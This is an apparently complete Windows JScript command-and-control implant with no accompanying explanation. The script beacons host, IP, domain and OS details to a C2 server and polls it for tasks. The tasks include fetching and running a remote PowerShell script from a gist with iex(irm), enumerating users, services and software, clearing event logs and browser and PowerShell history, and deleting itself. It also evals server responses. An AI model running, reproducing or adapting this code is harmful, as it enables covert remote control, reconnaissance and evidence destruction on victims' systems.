var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var http = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
function toISOString(_0x157c85) {
  return _0x157c85.getUTCFullYear() + '-' + (_0x157c85.getUTCMonth() + 0x1 < 0xa ? '0' + (_0x157c85.getUTCMonth() + 0x1) : _0x157c85.getUTCMonth() + 0x1) + '-' + (_0x157c85.getUTCDate() < 0xa ? '0' + _0x157c85.getUTCDate() : _0x157c85.getUTCDate()) + 'T' + (_0x157c85.getUTCHours() < 0xa ? '0' + _0x157c85.getUTCHours() : _0x157c85.getUTCHours()) + ':' + (_0x157c85.getUTCMinutes() < 0xa ? '0' + _0x157c85.getUTCMinutes() : _0x157c85.getUTCMinutes()) + ':' + (_0x157c85.getUTCSeconds() < 0xa ? '0' + _0x157c85.getUTCSeconds() : _0x157c85.getUTCSeconds()) + '.' + String((_0x157c85.getUTCMilliseconds() / 0x3e8).toFixed(0x3)).slice(0x2, 0x5) + 'Z';
}
function getCurrentDirectory() {
  try {
    return fso.GetParentFolderName(WScript.ScriptFullName);
  } catch (_0x2d9569) {
    return shell.CurrentDirectory;
  }
}
function generateTaskId() {
  var _0x2f64a5 = new Date().getTime();
  var _0x43d5c3 = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (_0x596251) {
    var _0x1e8dab = (_0x2f64a5 + Math.random() * 0x10) % 0x10 | 0x0;
    _0x2f64a5 = Math.floor(_0x2f64a5 / 0x10);
    return (_0x596251 == 'x' ? _0x1e8dab : _0x1e8dab & 0x3 | 0x8).toString(0x10);
  });
  return _0x43d5c3;
}
function generateRandomString(_0xbe729e) {
  var _0x296f50 = '';
  for (var _0x2e33ab = 0x0; _0x2e33ab < _0xbe729e; _0x2e33ab++) {
    _0x296f50 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length));
  }
  return _0x296f50;
}
function registryKeyExists() {
  try {
    return true;
  } catch (_0xf69078) {
    return false;
  }
}
function initializeRegistry() {
  try {
    if (!registryKeyExists()) {
      var _0x1fc109 = generateRandomString(0x8);
      shell.RegWrite("HKCU\\SOFTWARE\\hensh1n\\", _0x1fc109, "REG_SZ");
      return true;
    } else {
      return false;
    }
  } catch (_0x436eaa) {
    return false;
  }
}
function getHostname() {
  try {
    return shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
  } catch (_0x484e2d) {
    return "Unknown";
  }
}
function getPublicIP() {
  try {
    var _0x3e8f75 = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
    _0x3e8f75.open('GET', "https://api.ipify.org?format=text", false);
    _0x3e8f75.setRequestHeader('User-Agent', 'Mozilla/5.0');
    _0x3e8f75.send();
    return _0x3e8f75.responseText;
  } catch (_0x5bdd77) {
    return 'Unknown';
  }
}
function getDomain() {
  try {
    var _0x8a5efc = shell.ExpandEnvironmentStrings("%USERDOMAIN%");
    if (_0x8a5efc === "%USERDOMAIN%" || _0x8a5efc === getHostname()) {
      return "WORKGROUP";
    }
    return _0x8a5efc;
  } catch (_0x1f1c18) {
    return "Unknown";
  }
}
function getOperatingSystem() {
  try {
    var _0x41371b = GetObject("winmgmts:\\\\.\\root\\cimv2");
    var _0x4af3cc = new Enumerator(_0x41371b.ExecQuery("SELECT * FROM Win32_OperatingSystem"));
    if (!_0x4af3cc.atEnd()) {
      var _0x299683 = _0x4af3cc.item();
      return {
        'name': _0x299683.Caption,
        'version': _0x299683.Version,
        'architecture': _0x299683.OSArchitecture
      };
    }
  } catch (_0x2575a8) {
    return {
      'name': "Unknown",
      'version': "Unknown",
      'architecture': "Unknown"
    };
  }
}
function escapeJSON(_0x1587c2) {
  var _0x19acbd = '';
  for (var _0x1aec83 = 0x0; _0x1aec83 < _0x1587c2.length; _0x1aec83++) {
    var _0x2b4cd2 = _0x1587c2.charAt(_0x1aec83);
    switch (_0x2b4cd2) {
      case "\\":
        _0x19acbd += "\\\\";
        break;
      case "\"":
        _0x19acbd += "\\\"";
        break;
      case "\n":
        _0x19acbd += "\\n";
        break;
      case "\r":
        _0x19acbd += "\\r";
        break;
      case "\t":
        _0x19acbd += "\\t";
        break;
      case "\b":
        _0x19acbd += "\\b";
        break;
      case "\f":
        _0x19acbd += "\\f";
        break;
      default:
        _0x19acbd += _0x2b4cd2;
    }
  }
  return _0x19acbd;
}
function simpleJSONStringify(_0x7189e9) {
  var _0xb35e3 = '{';
  var _0x23d6ec = true;
  for (var _0x29bb6f in _0x7189e9) {
    if (_0x7189e9.hasOwnProperty(_0x29bb6f)) {
      if (!_0x23d6ec) {
        _0xb35e3 += ',';
      }
      _0x23d6ec = false;
      _0xb35e3 += "\"" + escapeJSON(_0x29bb6f) + "\":";
      var _0x4ff2b8 = _0x7189e9[_0x29bb6f];
      if (typeof _0x4ff2b8 === "string") {
        _0xb35e3 += "\"" + escapeJSON(_0x4ff2b8) + "\"";
      } else {
        if (typeof _0x4ff2b8 === 'number' || typeof _0x4ff2b8 === "boolean") {
          _0xb35e3 += _0x4ff2b8;
        } else {
          if (_0x4ff2b8 === null || _0x4ff2b8 === undefined) {
            _0xb35e3 += "null";
          } else {
            if (typeof _0x4ff2b8 === "object") {
              if (_0x4ff2b8 instanceof Array) {
                _0xb35e3 += '[';
                for (var _0x2b47da = 0x0; _0x2b47da < _0x4ff2b8.length; _0x2b47da++) {
                  if (_0x2b47da > 0x0) {
                    _0xb35e3 += ',';
                  }
                  if (typeof _0x4ff2b8[_0x2b47da] === 'object') {
                    _0xb35e3 += simpleJSONStringify(_0x4ff2b8[_0x2b47da]);
                  } else if (typeof _0x4ff2b8[_0x2b47da] === 'string') {
                    _0xb35e3 += "\"" + escapeJSON(_0x4ff2b8[_0x2b47da]) + "\"";
                  } else {
                    _0xb35e3 += _0x4ff2b8[_0x2b47da];
                  }
                }
                _0xb35e3 += ']';
              } else {
                _0xb35e3 += simpleJSONStringify(_0x4ff2b8);
              }
            }
          }
        }
      }
    }
  }
  _0xb35e3 += '}';
  return _0xb35e3;
}
function executePowerShell(_0x10c8c8, _0x127e9d) {
  try {
    if (!_0x127e9d) {
      _0x127e9d = 0x1e;
    }
    var _0x514142 = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + _0x10c8c8.replace(/"/g, "\\\"") + "\"";
    var _0xf1796 = shell.Exec(_0x514142);
    var _0x5cd9e3 = '';
    var _0x365d63 = 0x0;
    var _0x442bda = _0x127e9d * 0x3e8;
    while (_0xf1796.Status === 0x0 && _0x365d63 < _0x442bda) {
      WScript.Sleep(0x64);
      _0x365d63 += 0x64;
    }
    if (_0xf1796.Status === 0x0) {
      _0xf1796.Terminate();
      return {
        'success': false,
        'output': '',
        'error': "Command timed out after " + _0x127e9d + " seconds",
        'exitCode': -0x1
      };
    }
    if (!_0xf1796.StdOut.AtEndOfStream) {
      _0x5cd9e3 = _0xf1796.StdOut.ReadAll();
    }
    var _0x58ab3a = '';
    if (!_0xf1796.StdErr.AtEndOfStream) {
      _0x58ab3a = _0xf1796.StdErr.ReadAll();
    }
    return {
      'success': true,
      'output': _0x5cd9e3,
      'error': _0x58ab3a,
      'exitCode': _0xf1796.ExitCode
    };
  } catch (_0x3f214c) {
    return {
      'success': false,
      'output': '',
      'error': _0x3f214c.message,
      'exitCode': -0x1
    };
  }
}
function collectDomainInfo() {
  var _0x50b738 = [{
    'cmd': "Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Domain, DomainRole | ConvertTo-Json",
    'timeout': 0xa
  }, {
    'cmd': "Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | ConvertTo-Json",
    'timeout': 0xa
  }, {
    'cmd': "Get-WmiObject -Class Win32_UserAccount -Filter \"LocalAccount='True'\" | Select-Object Name, Disabled, Description | ConvertTo-Json",
    'timeout': 0xa
  }, {
    'cmd': "Get-WmiObject -Class Win32_Group -Filter \"LocalAccount='True'\" | Select-Object Name, Description | ConvertTo-Json",
    'timeout': 0xa
  }, {
    'cmd': "Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode -First 100 | ConvertTo-Json",
    'timeout': 0xa
  }, {
    'cmd': "Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter \"IPEnabled='True'\" | Select-Object Description, IPAddress, MACAddress | ConvertTo-Json",
    'timeout': 0xa
  }, {
    'cmd': "Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor -First 50 | ConvertTo-Json",
    'timeout': 0x14
  }];
  var _0x2fd83b = [];
  for (var _0x32b061 = 0x0; _0x32b061 < _0x50b738.length; _0x32b061++) {
    var _0x437bac = executePowerShell(_0x50b738[_0x32b061].cmd, _0x50b738[_0x32b061].timeout);
    _0x2fd83b.push({
      'command': _0x50b738[_0x32b061].cmd,
      'output': _0x437bac.output,
      'error': _0x437bac.error,
      'exitCode': _0x437bac.exitCode
    });
    WScript.Sleep(0xc8);
  }
  return _0x2fd83b;
}
function clearEventLogsAndHistory() {
  var _0x3ad6a1 = [{
    'cmd': "wevtutil cl System",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl Application",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl Security",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl Setup",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl 'Windows PowerShell'",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl 'Microsoft-Windows-PowerShell/Admin'",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl 'Microsoft-Windows-WinRM/Operational'",
    'timeout': 0x1e
  }, {
    'cmd': "wevtutil cl 'Microsoft-Windows-TaskScheduler/Operational'",
    'timeout': 0x1e
  }, {
    'cmd': "Remove-Item -Path '$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' -Force -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Remove-Item -Path '$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*' -Force -Recurse -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Clear-History -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Remove-Item -Path '$env:APPDATA\\Microsoft\\Windows\\Recent\\*' -Force -Recurse -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Remove-Item -Path '$env:APPDATA\\Microsoft\\Office\\Recent\\*' -Force -Recurse -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Remove-Item -Path 'C:\\Windows\\Prefetch\\*' -Force -ErrorAction SilentlyContinue",
    'timeout': 0xf
  }, {
    'cmd': "Remove-Item -Path '$env:TEMP\\*' -Force -Recurse -ErrorAction SilentlyContinue",
    'timeout': 0x14
  }, {
    'cmd': "Remove-Item -Path 'C:\\Windows\\Temp\\*' -Force -Recurse -ErrorAction SilentlyContinue",
    'timeout': 0x14
  }, {
    'cmd': "Remove-Item -Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History*' -Force -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Remove-Item -Path '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History*' -Force -ErrorAction SilentlyContinue",
    'timeout': 0xa
  }, {
    'cmd': "Stop-Service -Name 'WSearch' -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\*' -Force -Recurse -ErrorAction SilentlyContinue; Start-Service -Name 'WSearch' -ErrorAction SilentlyContinue",
    'timeout': 0x1e
  }];
  var _0x43d72e = [];
  for (var _0x9fc245 = 0x0; _0x9fc245 < _0x3ad6a1.length; _0x9fc245++) {
    var _0x26766c = executePowerShell(_0x3ad6a1[_0x9fc245].cmd, _0x3ad6a1[_0x9fc245].timeout);
    _0x43d72e.push({
      'command': _0x3ad6a1[_0x9fc245].cmd,
      'success': _0x26766c.exitCode === 0x0,
      'output': _0x26766c.output,
      'error': _0x26766c.error
    });
    WScript.Sleep(0x1f4);
  }
  return _0x43d72e;
}
function selfDestruct() {
  try {
    var _0x8bdeda = getCurrentDirectory();
    var _0x456dc0 = shell.ExpandEnvironmentStrings("%TEMP%") + "\\cleanup_" + new Date().getTime() + '.bat';
    var _0x4112a8 = fso.CreateTextFile(_0x456dc0, true);
    _0x4112a8.WriteLine("@echo off");
    _0x4112a8.WriteLine("timeout /t 2 /nobreak > nul");
    var _0x479644 = fso.GetFolder(_0x8bdeda);
    var _0x3e5af6 = new Enumerator(_0x479644.Files);
    for (; !_0x3e5af6.atEnd(); _0x3e5af6.moveNext()) {
      var _0x2c8b58 = _0x3e5af6.item();
      _0x4112a8.WriteLine("del /f /q /a \"" + _0x2c8b58.Path + "\"");
    }
    _0x4112a8.WriteLine("del /f /q \"%~f0\"");
    _0x4112a8.Close();
    shell.Run("cmd.exe /c \"" + _0x456dc0 + "\"", 0x0, false);
    WScript.Quit();
  } catch (_0x9a9eb6) {}
}
function sendToServer(_0x32d962, _0x49d14e) {
  var _0x23389c = "http://192.168.11.1:3000" + _0x32d962;
  try {
    http.open('POST', _0x23389c, false);
    http.setRequestHeader("Content-Type", 'application/json');
    http.setRequestHeader("User-Agent", "C2-Agent/1.0");
    var _0x390e5d = simpleJSONStringify(_0x49d14e);
    http.send(_0x390e5d);
    if (http.status === 0xc8) {
      var _0x56a4ad = eval('(' + http.responseText + ')');
      return {
        'success': true,
        'response': _0x56a4ad
      };
    } else {
      return {
        'success': false,
        'error': "HTTP " + http.status
      };
    }
  } catch (_0x2d87a0) {
    return {
      'success': false,
      'error': _0x2d87a0.message
    };
  }
}
function checkIn() {
  var _0x5b04fc = generateTaskId();
  var _0x4cc603 = getOperatingSystem();
  var _0x2c46da = {
    'taskId': _0x5b04fc,
    'hostname': getHostname(),
    'publicIP': getPublicIP(),
    'domain': getDomain(),
    'operatingSystem': _0x4cc603.name,
    'osVersion': _0x4cc603.version,
    'osArchitecture': _0x4cc603.architecture,
    'currentDirectory': getCurrentDirectory(),
    'timestamp': new Date().getUTCFullYear() + '-' + (new Date().getUTCMonth() + 0x1 < 0xa ? '0' + (new Date().getUTCMonth() + 0x1) : new Date().getUTCMonth() + 0x1) + '-' + (new Date().getUTCDate() < 0xa ? '0' + new Date().getUTCDate() : new Date().getUTCDate()) + 'T' + (new Date().getUTCHours() < 0xa ? '0' + new Date().getUTCHours() : new Date().getUTCHours()) + ':' + (new Date().getUTCMinutes() < 0xa ? '0' + new Date().getUTCMinutes() : new Date().getUTCMinutes()) + ':' + (new Date().getUTCSeconds() < 0xa ? '0' + new Date().getUTCSeconds() : new Date().getUTCSeconds()) + '.' + String((new Date().getUTCMilliseconds() / 0x3e8).toFixed(0x3)).slice(0x2, 0x5) + 'Z'
  };
  return sendToServer('/api/agent/checkin', _0x2c46da);
}
function processCommand(_0x3ee315) {
  if (!_0x3ee315 || !_0x3ee315.taskid || !_0x3ee315.optionid) {
    return;
  }
  switch (_0x3ee315.optionid) {
    case 0x1:
      var _0x6f0e5f = executePowerShell("iex(irm 'https://gist.githubusercontent.com/oumazio/fdd0b2711ab501b30b53039fa32bc9ca/raw/ca4f9da41c5c64b3b43f4b0416f8ee0d0e400803/secr3t.txt')");
      sendToServer("/api/agent/result", {
        'taskid': _0x3ee315.taskid,
        'optionid': 0x1,
        'url': "https://gist.githubusercontent.com/oumazio/fdd0b2711ab501b30b53039fa32bc9ca/raw/ca4f9da41c5c64b3b43f4b0416f8ee0d0e400803/secr3t.txt",
        'command': "iex(irm 'https://gist.githubusercontent.com/oumazio/fdd0b2711ab501b30b53039fa32bc9ca/raw/ca4f9da41c5c64b3b43f4b0416f8ee0d0e400803/secr3t.txt')",
        'output': _0x6f0e5f.output,
        'error': _0x6f0e5f.error,
        'exitCode': _0x6f0e5f.exitCode
      });
      break;
    case 0x2:
      var _0x38ddeb = collectDomainInfo();
      sendToServer("/api/agent/result", {
        'taskid': _0x3ee315.taskid,
        'optionid': 0x2,
        'domainInfo': _0x38ddeb
      });
      break;
    case 0x3:
      sendToServer("/api/agent/result", {
        'taskid': _0x3ee315.taskid,
        'optionid': 0x3,
        'message': "Self-destruct initiated"
      });
      selfDestruct();
      break;
    case 0x4:
      var _0x1ca764 = clearEventLogsAndHistory();
      sendToServer("/api/agent/result", {
        'taskid': _0x3ee315.taskid,
        'optionid': 0x4,
        'message': "Event logs and PowerShell history clearing completed",
        'results': _0x1ca764
      });
      break;
  }
}
function main() {
  initializeRegistry();
  var _0x4da710 = checkIn();
  if (_0x4da710.success) {
    if (_0x4da710.response && _0x4da710.response.command) {
      processCommand(_0x4da710.response.command);
    }
  }
  while (true) {
    WScript.Sleep(0x1388);
    var _0x4ea1d9 = sendToServer("/api/agent/poll", {
      'taskId': generateTaskId(),
      'hostname': getHostname()
    });
    if (_0x4ea1d9.success && _0x4ea1d9.response && _0x4ea1d9.response.command) {
      processCommand(_0x4ea1d9.response.command);
    }
  }
}
try {
  main();
} catch (_0x2f3530) {}